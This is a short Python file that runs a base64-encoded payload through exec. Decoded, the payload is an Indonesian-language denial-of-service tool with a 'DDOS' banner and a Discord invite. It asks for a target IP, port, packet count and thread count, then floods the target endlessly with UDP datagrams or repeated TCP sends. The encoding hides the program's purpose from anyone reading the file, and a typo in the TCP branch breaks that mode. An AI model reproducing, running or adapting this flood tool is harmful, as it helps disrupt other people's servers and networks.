import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgcmFuZG9tCmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgb3MKaW1wb3J0IHN5cwoKb3Muc3lzdGVtKCJjbGVhciIpIApwcmludCgiIiJcMDMzWzkybQogIF9fX18gIF9fX18gICBfX18gIF9fX18gIAogfCAgXyBcfCAgXyBcIC8gXyBcLyBfX198IAogfCB8IHwgfCB8IHwgfCB8IHwgXF9fXyBcIAogfCB8X3wgfCB8X3wgfCB8X3wgfF9fXykgfAogfF9fX18vfF9fX18vIFxfX18vfF9fX18vIAogICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQpwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKcHJpbnQoIiBET05UIEFCVVNFIFRPT0wiKQpwcmludCgiIEtBTE8gTUFVIFJFTUFLRSBQTSBHVUEiKQpwcmludCgiIEpPSU4gTVkgQ09NTVVOSVRZIDogaHR0cHM6Ly9kaXNjb3JkLmdnL3VHcERIdmF1NUEiKQpwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKaXAgPSBzdHIoaW5wdXQoIiBJUCBUQVJHRVQ6IikpCnBvcnQgPSBpbnQoaW5wdXQoIiBQT1JUOiIpKQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBZT0sgRERPUyh5L24pOiIpKQp0aW1lcyA9IGludChpbnB1dCgiIFBBQ0tFVDoiKSkKdGhyZWFkcyA9IGludChpbnB1dCgiIElTSSBQQUNLRVQ6IikpCmRlZiBydW4oKToKICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAyNCkKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW1RPSyBUT0sgVE9LXSIsIltUT0sgVE9LIFRPS10iKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikKICAgICAgICAgICAgcHJpbnQoaSArIiBQRVJNSVNJIFBBS0VUIE5ZQSBQQUshISEiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIlshXSBZQUggRE9XTiIpCgpkZWYgcnVuMigpOgogICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxNikKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW1RPSyBUT0sgVE9LXSIsIltUT0sgVE9LIFRPS10iKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQogICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIHByaW50KGkgKyIgUEVSTUlTSSBQQUtFVCBOWUEgUEFLISEhIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICBwcmludCgiWyFdIFlBSCBET1dOIikKCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgogICAgaWYgY2hvaWNlID09ICd5JzoKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQogICAgICAgIHRoLnN0YXJ0KCkKICAgIGVsc2U6CiAgICAgICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmd3dCA9IHJ1bjIpCiAgICAgICAgdGguc3RhcnQoKQ=='))